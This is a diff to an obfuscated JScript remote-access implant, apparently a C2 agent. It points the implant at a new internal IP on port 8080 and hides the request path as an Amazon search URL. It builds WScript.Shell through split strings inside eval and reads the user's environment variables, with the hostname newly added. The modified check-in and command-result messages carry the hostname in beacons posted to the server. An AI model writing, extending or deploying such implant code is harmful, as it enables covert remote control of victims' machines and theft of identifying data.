@@ -1,6 +1,6 @@
 //Define variables
 var ho = "192.168."
-var me = "0.26"
+var me = "0.90"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -18,7 +18,7 @@ eval("var runner = new Act"+x+"ject(\"WScr\" +   \"ipt.Sh\"+  \"ell\")")
 var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
 var cs = runner.ExpandEnvironmentStrings("%C"+  "OmSP"    +"Ec%");
 var un = runner.ExpandEnvironmentStrings("%US"+  "ER"+"NA"+  "ME%");
-
+var hn = runner.ExpandEnvironmentStrings("%COM" + "PUT"  +"ERN" + "AME%");
 var id = Math.floor(Math.random() * 9999999999).toString()
 var type = "js"
 
@@ -138,7 +138,7 @@ while(true)
   try
   {
     var retval = ""
-    var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
+    var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"}';
     var serverMsg = post(home, checkin);
 	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
     // Convert json string to json object
@@ -238,7 +238,7 @@ while(true)
       if(retval == "") {
         retval = "[*] No results to return or error getting result data"
       }
-      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","'+rettype+'":"'+b64e(retval)+'"}';
+      var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"}';
       jsObject.cmnd = ""
       post(home, resp)
     }
